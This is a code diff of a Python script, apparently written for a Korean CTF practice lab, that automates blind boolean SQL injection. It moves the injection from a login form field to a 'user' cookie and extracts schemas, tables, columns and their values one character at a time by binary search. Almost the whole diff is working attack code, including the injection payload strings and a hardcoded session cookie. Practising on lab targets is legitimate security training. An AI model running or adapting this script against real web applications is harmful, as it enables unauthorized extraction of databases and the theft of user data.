@@ -3,12 +3,11 @@ from user_agent import generate_user_agent
 from bs4 import BeautifulSoup
 import pandas as pd
 
-base_url = 'http://ctf2.segfaulthub.com:7777/sqli_3/login.php'
-headers = {'User-Agent': generate_user_agent(os='win', device_type='desktop')}
-data = {
-    "UserId": "",        # 사용자 ID
-    "Password": "1234", # 비밀번호
-    "Submit": "Login"         # 버튼 값
+base_url = 'http://ctf2.segfaulthub.com:7777/sqli_9/mypage.php'
+# 쿠키 설정
+cookies = {
+    "user": "zoono1004",  # 기존 쿠키
+    "PHPSESSID": "tm9cq8ol7dsh11f0to77rg08rs"  # PHP 세션 ID 추가 
 }
 
 def fetch_data(query, limit, len):
@@ -21,32 +20,33 @@ def fetch_data(query, limit, len):
             high = 126
             while low <= high:  # 33부터 126까지
                 x = int((low + high) / 2)
-                data['UserId'] = f"normaltic' and (ascii(substr(({query} limit {index},1),{target_len},1)) > {x}) and '1'='1"
-                response = requests.post(base_url, headers=headers, data=data)
+                cookies['user'] = f"zoono1004' and (select 1 union select 2 where (ascii(substr(({query} limit {index},1),{target_len},1)) > {x})) and '1'='1"
+                response = requests.get(base_url, cookies=cookies)
                 soup = BeautifulSoup(response.text, "html.parser")
             
                 try:
-                    result = soup.find("div", {"class": "alert alert-danger alert-dismissible"})
+                    result = soup.find("input", {"placeholder": "NO TEXT"})
                     if result is None:
                         low = x + 1
                     else:
                         high = x - 1
                 except AttributeError:
                     break
-            data['UserId'] = f"normaltic' and (ascii(substr(({query} limit {index},1),{target_len},1)) = {x}) and '1'='1"
-            response = requests.post(base_url, headers=headers, data=data)
+            cookies['user'] = f"zoono1004' and (select 1 union select 2 where (ascii(substr(({query} limit {index},1),{target_len},1)) = {x})) and '1'='1"
+            response = requests.get(base_url, cookies=cookies)
             soup = BeautifulSoup(response.text, "html.parser")
         
             try:
-                result = soup.find("div", {"class": "alert alert-danger alert-dismissible"})
+                result = soup.find("input", {"placeholder": "NO TEXT"})
                 if result is None:
                     guessed_char = chr(x)
                     guessed_word += guessed_char
                 else:
-                    data['UserId'] = f"normaltic' and (ascii(substr(({query} limit {index},1),{target_len},1)) = {x+1}) and '1'='1"
-                    response = requests.post(base_url, headers=headers, data=data)
+                    cookies['user'] = f"zoono1004' and (select 1 union select 2 where (ascii(substr(({query} limit {index},1),{target_len},1)) = {x+1})) and '1'='1"
+                    response = requests.get(base_url, cookies=cookies)
                     soup = BeautifulSoup(response.text, "html.parser")
-                    result = soup.find("div", {"class": "alert alert-danger alert-dismissible"})
+
+                    result = soup.find("input", {"placeholder": "NO TEXT"})
                     if result is None:
                         guessed_char = chr(x+1)
                     else:
@@ -88,14 +88,16 @@ def fetch_all_data():
             if schema:  # 비어있지 않은 스키마에 대해 처리
                 print(f"\nSchema: {schema}")
                 tables = fetch_tables(schema)
-                print(f"{schema}:", tables)
+                if len(tables) > 0:  
+                    print(f"{schema}:", tables)
                 for table in tables:
                     if table:  # 비어있지 않은 테이블에 대해 처리
                         columns = fetch_columns(table, schema)
-                        
+                        print(f"{table}:", columns)
                         for column in columns:
                             if column:  # 비어있지 않은 컬럼에 대해 처리
                                 data = fetch_data_from_column(column, table, schema)
+                                print(f"{column}:", data)
                                 if data:  # 빈 데이터 제외
                                     # 데이터를 리스트로 저장
                                     for value in data:
@@ -106,13 +108,6 @@ def fetch_all_data():
                                             'Value': value.strip()
                                         })
     
-    # 데이터를 DataFrame으로 변환
-    df = pd.DataFrame(all_data)
-    
-    # 엑셀 파일로 저장
-    output_file = r'C:\Users\User\Desktop\hacking\파이썬\output_data.csv'
-    df.to_csv(output_file, index=False)
-    print(f"Data saved to {output_file}")
     return all_data
 
 if __name__ == "__main__":
